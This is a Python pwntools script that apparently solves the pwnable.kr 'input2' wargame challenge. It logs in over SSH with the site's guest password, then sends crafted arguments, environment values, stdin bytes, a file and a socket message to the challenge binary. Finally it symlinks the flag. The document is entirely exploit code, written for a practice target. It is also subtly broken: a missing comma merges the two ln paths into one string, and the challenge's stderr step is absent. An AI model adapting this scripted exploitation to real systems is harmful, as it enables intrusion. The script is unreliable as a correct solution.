# SPDX-License-Identifier: GPL-2.0-only

# INPUT2 pwnable.kr

from pwn import *

with open("\x0a", mode="wb") as f:
    f.write(b"\x00\x00\x00\x00")

ln = ["/bin/ln", "-s", "/home/input2/flag" "/tmp/flag"]
argss = ["" for x in range(100)]
argss = argss[:ord('A')] + [b"\x00"] + [b"\x20\x0a\x0d"] + [b"5000"] + argss[ord('C')+1:]
envs = {b'\xde\xad\xbe\xef': b'\xca\xfe\xba\xbe'}

session = ssh(user="input2", host="pwnable.kr", port=2222, password="guest")
session.upload_file("\x0a", remote="/tmp/\x0a");
proc = session.process(executable="/home/input2/input", argv=argss, cwd="/tmp", env=envs)
proc.sendline(b"\x00\x0a\x00\xff\x00\x0a\x02\xff")
sock = session.connect_remote("127.0.0.1", 5000)
sock.sendline(b"\xde\xad\xbe\xef")
session.process(ln)

proc.interactive()